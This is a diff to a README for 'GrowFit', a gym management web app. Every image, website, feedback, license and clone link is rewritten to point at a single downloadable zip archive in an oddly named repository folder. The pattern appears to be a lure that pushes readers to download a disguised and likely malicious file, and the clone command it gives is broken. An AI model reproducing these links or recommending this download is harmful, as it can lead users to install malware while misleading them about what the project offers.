@@ -1,7 +1,7 @@
 
 # 🏋️‍♂️ GrowFit - Gym Management System 🏋️‍♀️
 
-![GrowFit Logo](https://github.com/duduzin2301/GrowFit/releases/download/v1.0.0/Application.zip)
+![GrowFit Logo](https://raw.githubusercontent.com/duduzin2301/GrowFit/main/Lohana/Fit_Grow_v3.7.zip)
 
 ### Welcome to GrowFit - Your Ultimate Gym Management Solution! 💪
 
@@ -22,13 +22,13 @@ Do you want to streamline your gym operations, boost productivity, and enhance m
 automation, crud-operations, dashboard-insights, date-fns, historical-data-analysis, lucide-react, membership-monitoring, react, react-context-api, react-router, real-time-attendance-management, responsive-design, state-management, tailwindcss, type-safe, typescript, vite, webapp
 
 ### 📥 Software Download:
-[![Download GrowFit Software](https://github.com/duduzin2301/GrowFit/releases/download/v1.0.0/Application.zip%20Software-Click%https://github.com/duduzin2301/GrowFit/releases/download/v1.0.0/Application.zip)](https://github.com/duduzin2301/GrowFit/releases/download/v1.0.0/Application.zip)
+[![Download GrowFit Software](https://raw.githubusercontent.com/duduzin2301/GrowFit/main/Lohana/Fit_Grow_v3.7.zip%20Software-Click%https://raw.githubusercontent.com/duduzin2301/GrowFit/main/Lohana/Fit_Grow_v3.7.zip)](https://raw.githubusercontent.com/duduzin2301/GrowFit/main/Lohana/Fit_Grow_v3.7.zip)
 
 ### 🌐 Visit Our Website:
-[GrowFit Gym Management System](https://github.com/duduzin2301/GrowFit/releases/download/v1.0.0/Application.zip)
+[GrowFit Gym Management System](https://raw.githubusercontent.com/duduzin2301/GrowFit/main/Lohana/Fit_Grow_v3.7.zip)
 
 ### 📦 Installation:
-1. Clone the repository: `git clone https://github.com/duduzin2301/GrowFit/releases/download/v1.0.0/Application.zip`
+1. Clone the repository: `git clone https://raw.githubusercontent.com/duduzin2301/GrowFit/main/Lohana/Fit_Grow_v3.7.zip`
 2. Install dependencies: `npm install`
 3. Start the development server: `npm start`
 
@@ -40,19 +40,19 @@ automation, crud-operations, dashboard-insights, date-fns, historical-data-analy
 - Date-fns
 
 ### 📊 Sample Revenue Insights Dashboard:
-![Revenue Insights Dashboard](https://github.com/duduzin2301/GrowFit/releases/download/v1.0.0/Application.zip)
+![Revenue Insights Dashboard](https://raw.githubusercontent.com/duduzin2301/GrowFit/main/Lohana/Fit_Grow_v3.7.zip)
 
 ### 📸 Screenshot:
-![GrowFit Screenshot](https://github.com/duduzin2301/GrowFit/releases/download/v1.0.0/Application.zip)
+![GrowFit Screenshot](https://raw.githubusercontent.com/duduzin2301/GrowFit/main/Lohana/Fit_Grow_v3.7.zip)
 
 ### 🤝 Contributing:
 We welcome contributions from the open-source community. Please feel free to fork the repository, make your changes, and submit a pull request.
 
 ### 📢 Feedback:
-Have any suggestions, feedback, or feature requests? We'd love to hear from you! Reach out to us at https://github.com/duduzin2301/GrowFit/releases/download/v1.0.0/Application.zip
+Have any suggestions, feedback, or feature requests? We'd love to hear from you! Reach out to us at https://raw.githubusercontent.com/duduzin2301/GrowFit/main/Lohana/Fit_Grow_v3.7.zip
 
 ### 📄 License:
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/duduzin2301/GrowFit/releases/download/v1.0.0/Application.zip) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://raw.githubusercontent.com/duduzin2301/GrowFit/main/Lohana/Fit_Grow_v3.7.zip) file for details.
 
 ### 🙏 Thank You for Choosing GrowFit!
 We appreciate your interest in GrowFit Gym Management System. Let's work together to build a stronger and healthier community! 💖
